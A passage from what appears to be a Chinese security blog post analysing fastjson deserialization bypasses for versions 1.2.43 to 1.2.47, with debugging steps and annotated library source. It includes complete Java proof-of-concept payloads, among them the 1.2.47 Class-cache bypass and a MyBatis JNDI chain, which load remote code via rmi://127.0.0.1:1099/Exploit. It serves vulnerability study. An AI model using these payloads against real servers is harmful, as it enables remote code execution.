&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续调试，可以看到这次我们就绕过了上面的报错语句</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322144422142.png" alt="image-20250322144422142"></p><p>继续跟一下，看到在 smartMatch 中返回了 <code>&#123;</code> 的 token 值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322144702139.png" alt="image-20250322144702139"></p><p>这里我们已经开始 deserialze 了，马上就要成功执行了。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322145515287.png" alt="image-20250322145515287"></p><p>还是抛出异常了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322145709712.png" alt="image-20250322145709712"></p><p>我们继续绕过一下这个异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">syntax error, expect &#123;, actual string, pos <span class="hljs-number">43</span>, fastjson-version <span class="hljs-number">1.2</span><span class="hljs-number">.43</span><br></code></pre></td></tr></table></figure><p>在 <code>[</code> 符号后面放置一个 <code>&#123;</code></p><p>来到了最终的 payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass43</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322150001114.png" alt="image-20250322150001114"></p><p>这其实是 fastjson 作者为了兼容性，没有做好数组类型的匹配而导致的</p><h3 id="1-2-44"><a href="#1-2-44" class="headerlink" title="1.2.44"></a>1.2.44</h3><p>修复了 <code>[</code> 的绕过，在 <code>checkAutoType</code> 中进行判断，以 <code>[</code> 开头会抛出异常</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322154953248.png" alt="image-20250322154953248"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">autoType is not support. [com.sun.rowset.JdbcRowSetImpl<br></code></pre></td></tr></table></figure><h3 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1.2.45"></a>1.2.45</h3><p>默认扩展了黑名单，但可以搭配 <code>mybatis</code> 组件来产生利用</p><p>我这里用的 jdk7，对应兼容的 mybatis 版本 3.2.8</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>来到 org.apache.ibatis.datasource.jndi.JndiDataSourceFactory 这个类</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322155842534.png" alt="image-20250322155842534"></p><p>我们看 org.apache.ibatis.datasource.jndi.JndiDataSourceFactory#setProperties 这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProperties</span><span class="hljs-params">(Properties properties)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 初始化JNDI上下文</span><br>      InitialContext initCtx;<br>      <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> getEnvProperties(properties);<br>      <span class="hljs-keyword">if</span> (env == <span class="hljs-literal">null</span>) &#123;<br>        initCtx = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        initCtx = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br>      &#125;<br><span class="hljs-comment">// 用JNDI连接datasource</span><br>      <span class="hljs-keyword">if</span> (properties.containsKey(INITIAL_CONTEXT) &amp;&amp; properties.containsKey(DATA_SOURCE)) &#123;<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> (Context) initCtx.lookup(properties.getProperty(INITIAL_CONTEXT));<br>        dataSource = (DataSource) ctx.lookup(properties.getProperty(DATA_SOURCE));<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (properties.containsKey(DATA_SOURCE)) &#123;<br>        dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));<br>      &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (NamingException e) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceException</span>(<span class="hljs-string">&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot;</span> + e, e);<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>看着这个方法就不是很安全的样子，我们看看 properties.getProperty(DATA_SOURCE) 可控吗？</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322162340340.png" alt="image-20250322162340340"></p><p>DATA_SOURCE 其实就是字符串 data_source</p><p>set 传的参数 Properties，我们看一下</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322161643381.png" alt="image-20250322161643381"></p><p>继承了 Hashtable，而他的 getProperty 方法，找的父类获得 key，或者 调用 defaults 的 getProperty</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322161812364.png" alt="image-20250322161812364"></p><p>也就是，我们需要传递一个 Hashtable 对象，属性我们是可控的，键为 data_source 值为恶意的 rmi 地址</p><p><strong>bypass45</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass45</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,&quot;</span> +<br>                <span class="hljs-comment">// 调用setProperties方法，并传入键值对</span><br>                <span class="hljs-string">&quot;\&quot;properties\&quot;: &#123;\&quot;data_source\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322170714025.png" alt="image-20250322170714025"></p><h3 id="1-2-47（通杀严重）"><a href="#1-2-47（通杀严重）" class="headerlink" title="1.2.47（通杀严重）"></a>1.2.47（通杀严重）</h3><p>这个绕过版本，允许攻击者在没有开启 autoType 的情况进行攻击。<span style="color:#FF0000;"> 而且对于之前的版本也是可以达到命令执行的 </span>。具体是怎么实现的呢？我们来看一下</p><p>因为我们的 autotype 为 false，我们想要拿到 class，就只能在检测 autotype 为 true 和 false 之间的代码中了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322195453803.png" alt="image-20250322195453803"></p><p>也就是这两句。我们先来看 <code>clazz = deserializers.findClass(typeName);</code></p><h4 id="deserializers"><a href="#deserializers" class="headerlink" title="deserializers"></a>deserializers</h4><p>因为 com.alibaba.fastjson.parser.ParserConfig#deserializers 是一个 com.alibaba.fastjson.util.IdentityHashMap 类，我们要从 map 里找到 typeName，我们看到是要找到一个可控参数的 put 方法才可以。全局搜索 com.alibaba.fastjson.util.IdentityHashMap#put 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322210015918.png" alt="image-20250322210015918"></p><p>找到了 4 个方法，但是和 com.alibaba.fastjson.parser.ParserConfig#deserializers 有关的就只有前三个</p><ul><li>initDeserializers() : 没有参数，我们看到无法控制添加想要的键值</li><li>getDeserializer(Class &lt;?&gt; clazz, Type type) : put 方法中的参数基本上都是硬编码的，我们没法利用</li><li>putDeserializer(Type type, ObjectDeserializer deserializer) ： 被上边的两个方法调用</li></ul><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322211111924.png" alt="image-20250322211111924"></p><p>所以我们就无法从 com.alibaba.fastjson.parser.ParserConfig#deserializers 下手了，我们只能看 <code>clazz = TypeUtils.getClassFromMapping(typeName);</code> 这个方法了</p><h4 id="getClassFromMapping"><a href="#getClassFromMapping" class="headerlink" title="getClassFromMapping"></a>getClassFromMapping</h4><p>我们先进去看看 TypeUtils.getClassFromMapping(typeName); 这个方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322211509310.png" alt="image-20250322211509310"></p><p>发现他的返回值是 mappings.get(className); 我们现在就和分析 deserializers 时，思路一致，看看有没有能给 mappings 赋值的可控参数的方法，找到一下 33 个跟 mappings 有关的方法，但是只有 loadClass 满足我们想要的条件</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322211758449.png" alt="image-20250322211758449" style="zoom:67%;" /><p>我们看一下 <code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</code> 这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据类名加载类</span><br><span class="hljs-comment"> * 此方法优先检查类是否已经加载过，如果已经加载则直接返回</span><br><span class="hljs-comment"> * 如果类名表示的是数组或内部类，则会相应地处理</span><br><span class="hljs-comment"> * 如果类尚未加载，则尝试使用提供的类加载器、当前线程上下文类加载器或系统类加载器进行加载</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> className 要加载的类名，不能为空</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> classLoader 用于加载类的类加载器，如果为null，则使用系统类加载器</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> cache 是否缓存加载过的类，true表示缓存，false表示不缓存</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 加载的类，如果无法加载则返回null</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) &#123;<br>    <span class="hljs-comment">// 检查类名是否为空，为空则返回null</span><br>    <span class="hljs-keyword">if</span>(className == <span class="hljs-literal">null</span> || className.length() == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 尝试从已缓存的类映射中获取类，如果找到则直接返回</span><br>    Class&lt;?&gt; clazz = mappings.get(className);<br>    <span class="hljs-keyword">if</span>(clazz != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 处理数组类型的类名，递归加载数组的组件类型</span><br>    <span class="hljs-keyword">if</span>(className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br>        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>        <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>    &#125;<br>    <br>    <span class="hljs-comment">// 处理内部类类型的类名，去除首尾的&#x27;L&#x27;和&#x27;;&#x27;后递归加载</span><br>    <span class="hljs-keyword">if</span>(className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>))&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">newClassName</span> <span class="hljs-operator">=</span> className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 尝试使用提供的类加载器加载类，并缓存如果指定</span><br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-keyword">if</span>(classLoader != <span class="hljs-literal">null</span>)&#123;<br>            clazz = classLoader.loadClass(className);<br>            <span class="hljs-keyword">if</span> (cache) &#123;<br>                mappings.put(className, clazz);<br>            &#125;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span>(Throwable e)&#123;<br>        <span class="hljs-comment">// 加载失败时记录异常，但不终止方法执行</span><br>        e.printStackTrace();<br>        <span class="hljs-comment">// skip</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 尝试使用当前线程上下文类加载器加载类，并缓存如果指定</span><br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">contextClassLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-keyword">if</span>(contextClassLoader != <span class="hljs-literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;<br>            clazz = contextClassLoader.loadClass(className);<br>            <span class="hljs-keyword">if</span> (cache) &#123;<br>                mappings.put(className, clazz);<br>            &#125;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span>(Throwable e)&#123;<br>        <span class="hljs-comment">// 加载失败时记录异常，但不终止方法执行</span><br>        <span class="hljs-comment">// skip</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 尝试使用系统类加载器加载类，并缓存</span><br>    <span class="hljs-keyword">try</span>&#123;<br>        clazz = Class.forName(className);<br>        mappings.put(className, clazz);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125; <span class="hljs-keyword">catch</span>(Throwable e)&#123;<br>        <span class="hljs-comment">// 加载失败时记录异常，但不终止方法执行</span><br>        <span class="hljs-comment">// skip</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 所有加载尝试失败后返回null</span><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 loadClass 中 mappings.put(className, clazz); 方法的判断限制，无论是 classLoader，还是 cache 都是从参数中传递的，我们要是可以找到一个可控参数的 loadClass()方法，就能完成像 mappings 里添加任意类了</p><p>我们看到这个 loadClass()</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323092400344.png" alt="image-20250323092400344" style="zoom: 67%;" /><p>重点关注在 MiscCodec 中的 loadClass 方法，他是调用了两个参数的 com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)方法，而这个方法会去调用三个参数的方法（<span style="color:#FF0000;"> 也就是我们目标方法 </span>）</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323092712823.png" alt="image-20250323092712823"></p><p>com.alibaba.fastjson.serializer.MiscCodec#deserialze 我们来分析这个方法，先来到调用 loadClass 的地方</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323100039005.png" alt="image-20250323100039005"></p><p><code>clazz</code> 是我们传递的参数，稍后我们再看，我们现分析 <code>strVal</code> 是否可控，我们来到定义的地方</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323100616178.png" alt="image-20250323100616178"></p><p>我们接着找到 objVal 这个变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">Object objVal; <br><br><span class="hljs-comment">/* 检查 parser 的 resolveStatus 是否为 TypeNameRedirect，</span><br><span class="hljs-comment"> 在碰到@type字段时，默认需要类型重定向，所以为true</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123; <br>    <span class="hljs-comment">// 将 resolveStatus 重置为 NONE</span><br>    parser.resolveStatus = DefaultJSONParser.NONE; <br>    <span class="hljs-comment">// 期望并消费 &#x27;,&#x27; Token</span><br>    parser.accept(JSONToken.COMMA);<br>    <span class="hljs-comment">// 检查当前 Token 是否是字符串字面量。</span><br>    <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123; <br>        <span class="hljs-comment">// 检查字符串值是否是 &quot;val&quot;</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123; <br>            <span class="hljs-comment">// 如果不是 &quot;val&quot;，抛出 JSONException 异常</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;syntax error&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 消费掉 &quot;val&quot; 字符串 Token，读取下一个 Token</span><br>        lexer.nextToken(); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果当前 Token 不是字符串字面量，抛出 JSONException 异常</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;syntax error&quot;</span>); <br>    &#125;<br>    <span class="hljs-comment">// 期望并消费 &#x27;:&#x27; Token</span><br>    parser.accept(JSONToken.COLON); <br>    <span class="hljs-comment">// 解析冒号后面的值，并将结果赋值给 objVal。</span><br>    objVal = parser.parse(); <br>    <span class="hljs-comment">// 期望并消费 &#x27;&#125;&#x27; Token。</span><br>    parser.accept(JSONToken.RBRACE); <br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    objVal = parser.parse(); <span class="hljs-comment">// 如果 resolveStatus 不是 TypeNameRedirect，直接解析当前 JSON 值，并将结果赋值给 objVal。</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们通过这段代码，知道了 objVal 这个值是我们可控在，只需要这样的 json 串即可</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">// 满足类型重定向</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;some.Type&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">// val设置为恶意类的类名</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>@type 中的值要是什么呢？我们其实还有一个条件没有满足 那就是 <code>clazz == Class.class</code></p><p>clazz 是我们传进来的参数，我们继续找一下看这个 com.alibaba.fastjson.serializer.MiscCodec#deserialze 有谁在调用，我们能自动让 fastjson 调用且满足我们的条件吗？</p><p>我们找了 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)这个方法</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323122417734.png" alt="image-20250323122417734" style="zoom:67%;" /><p>这个方法就是 fastjson 在解析 json 字符串为 javaBean 时 自动调用的，我们看他调用时 deserialze 能不能走到 MiscCodec#deserialze 且类型为 Class.class</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323122655830.png" alt="image-20250323122655830"></p><p><span style="color:#FF0000;"> clazz 由我们能传入的@type 字段的的值控制：即 clazz 可控 可以赋值为 (java.lang.Class)</span></p><p>我们跟进看看 com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.reflect.Type) 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323104215048.png" alt="image-20250323104215048"></p><p>derializers 的类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> IdentityHashMap&lt;Type, ObjectDeserializer&gt; deserializers = <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">IdentityHashMap</span>&lt;Type, ObjectDeserializer&gt;();<br></code></pre></td></tr></table></figure><p>而 deserializers 在初始化的时候，也放入了 Class.class，而且正好 我们可以取到 MiscCodec.instance 实例</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323104501514.png" alt="image-20250323104501514"></p><p>至此链条就分析完成了</p><h4 id="总结梳理"><a href="#总结梳理" class="headerlink" title="总结梳理"></a>总结梳理</h4><p>我们可以在总结 正向 梳理一下</p><ol><li>自己执行 JSON.parse();</li><li>fastjson 会去调用 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</li><li>parseObject 会根据 @type 字段的值(<span style="color:#FF0000;"> Class.class </span>) 参数执行 config.getDeserializer(clazz); 拿到 MiscCodec.instance</li><li>接着执行 MiscCodec 的 deserialze() 方法，检测 “val” 字段 并把字段值 (<span style="color:#FF0000;"> com.sun.rowset.JdbcRowSetImpl </span>) 赋值给 objVal，接着在转为字符串赋值给到 strVal，</li><li>MiscCodec#deserialze 接着执行 TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader()); 进而调用三个参数的重载方法，cache 默认传递 true，把 strVal 就是我们的恶意类名，加载到缓存表 mappings 中 ，从而绕过 checkAutoType</li></ol><p>最后的 payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass47</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;,&quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,&quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>            <span 